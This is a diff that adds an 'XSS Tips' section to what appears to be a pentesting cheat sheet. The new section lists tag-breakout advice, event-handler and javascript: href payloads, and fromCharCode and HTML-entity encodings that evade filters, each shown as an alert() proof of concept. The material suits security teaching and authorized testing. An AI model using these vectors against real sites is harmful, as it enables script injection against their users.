@@ -15,6 +15,31 @@ In other browsers other Content-Types can be used to execute arbitrary JS, check
 
 https://github.com/BlackFan/content-type-research/blob/master/XSS.md
 
+
+## XSS Tips
+* If your input is placed in the following tags, you must first exit these tags:
+    * `<title>`
+    * `<script>`
+    * `<textarea>`
+    * `<noscript>`
+    * `<style>`
+    
+* Magic events - If all events and tags were closed, use personal tags for this purpose:
+    * `onmouseover`
+    * `onclick`
+    * `oncopy`
+
+For Example: `<mehdi onmouseover=alert(1)>Hello mehdi0x90</mehdi>`
+
+* One of the places that can be used for XSS is the href tag. Even if your input is encoded and you cannot get out of the tag:
+    * `href="javascript:alert(1)"`
+* If the system does not allow quotes of any kind, you can `eval()` a fromCharCode in JavaScript to create any XSS vector you need:
+    * `<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>`
+* Since XSS examples that use a javascript: directive inside an `<IMG` tag do not work on Firefox this approach uses decimal HTML character references as a workaround:
+    * `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>`
+
+-----
+
 **xml Content Type**
 
 If the page is returnin a text/xml content-type it's possible to indicate a namespace and execute arbitrary JS
@@ -27,8 +52,6 @@ If the page is returnin a text/xml content-type it's possible to indicate a name
 
 ```
 
-
------
 **Injecting inside raw HTML**
 
 ```javascript
